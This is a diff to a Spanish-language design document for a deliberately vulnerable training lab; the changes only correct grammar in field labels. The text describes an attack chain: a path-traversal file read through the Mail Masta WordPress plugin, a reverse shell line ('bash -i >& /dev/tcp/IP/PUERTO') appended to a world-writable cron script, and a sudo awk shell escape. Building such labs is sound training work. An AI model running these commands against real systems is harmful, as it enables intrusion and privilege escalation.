@@ -90,9 +90,9 @@ El auditor deberá identificar la vulnerabilidad LFI para extraer las credencial
 
 - Activo afectado: ((WB-1)) Blog (WordPress) / ((MD-2)) lighttpd (Puerto 7664).
 
-- Configuración la provoca: La instalación y activación del plugin desactualizado Mail Masta (versión 1.0), el cual carece de sanitización en sus parámetros de entrada (específicamente en variables de inclusión de archivos).
+- Configuración que  la provoca: La instalación y activación del plugin desactualizado Mail Masta (versión 1.0), el cual carece de sanitización en sus parámetros de entrada (específicamente en variables de inclusión de archivos).
 
-- Riesgo representa: Permite a un atacante no autenticado evadir los controles de acceso a archivos del servidor web y leer archivos arbitrarios internos del sistema operativo (Local File Inclusion).
+- Riesgo que  representa: Permite a un atacante no autenticado evadir los controles de acceso a archivos del servidor web y leer archivos arbitrarios internos del sistema operativo (Local File Inclusion).
 
 - Cómo puede explotarse: Mediante el envío de una petición HTTP manipulada que utilice secuencias de salto de directorio (../../../../etc/passwd) a través del parámetro vulnerable del plugin para forzar al servidor a renderizar el contenido de archivos locales del sistema de archivos, tales como /etc/passwd o wp-config.php.
 
@@ -104,9 +104,9 @@ El auditor deberá identificar la vulnerabilidad LFI para extraer las credencial
 
 - Activo afectado: ((AC-1)) Usuarios y Archivos / Script de mantenimiento /opt/scripts/backup_notes.sh.
 
-- Configuración la provoca: Una asignación laxa e incorrecta de privilegios en el sistema de archivos (chmod 777) sobre el script de copia de seguridad, sumado a una tarea programada en el archivo general /etc/crontab que ejecuta dicho script cada minuto bajo el contexto del usuario clara_immerwahr.
+- Configuración que  la provoca: Una asignación laxa e incorrecta de privilegios en el sistema de archivos (chmod 777) sobre el script de copia de seguridad, sumado a una tarea programada en el archivo general /etc/crontab que ejecuta dicho script cada minuto bajo el contexto del usuario clara_immerwahr.
 
-- Riesgo representa: Permite la inyección y ejecución de código arbitrario. Cualquier usuario con acceso local de bajos privilegios puede modificar el comportamiento del script.
+- Riesgo que  representa: Permite la inyección y ejecución de código arbitrario. Cualquier usuario con acceso local de bajos privilegios puede modificar el comportamiento del script.
 
 - Cómo puede explotarse: El usuario inicial haber_fritz concatena una línea de comandos al final del archivo aprovechando su permiso de escritura (echo "bash -i >& /dev/tcp/IP/PUERTO 0>&1" >> /opt/scripts/backup_notes.sh). Al cumplirse el minuto, el demonio Cron procesa el archivo e inicia una conexión inversa automatizada.
 
@@ -118,9 +118,9 @@ El auditor deberá identificar la vulnerabilidad LFI para extraer las credencial
 
 - Activo afectado: ((SO-1)) Ubuntu Server / Reglas de Sudoers.
 
-- Configuración la provoca: La inclusión de una regla permisiva en el archivo de configuración /etc/sudoers que autoriza explícitamente a la cuenta clara_immerwahr a ejecutar el binario del sistema /usr/bin/awk con privilegios de administrador sin requerir autenticación (NOPASSWD:).
+- Configuración que la provoca: La inclusión de una regla permisiva en el archivo de configuración /etc/sudoers que autoriza explícitamente a la cuenta clara_immerwahr a ejecutar el binario del sistema /usr/bin/awk con privilegios de administrador sin requerir autenticación (NOPASSWD:).
 
-- Riesgo representa: Evasión total de los controles de restricción de privilegios. El binario permitido cuenta con funciones nativas que permiten invocar intérpretes de comandos secundarios (shells).
+- Riesgo que representa: Evasión total de los controles de restricción de privilegios. El binario permitido cuenta con funciones nativas que permiten invocar intérpretes de comandos secundarios (shells).
 
 - Cómo puede explotarse: Una vez que el auditor se encuentra en la sesión de Clara, invoca el binario abusando de la propiedad de ejecución de comandos interactivos (GTFOBins) mediante la sentencia: sudo awk 'BEGIN {system("/bin/sh")}'.
 
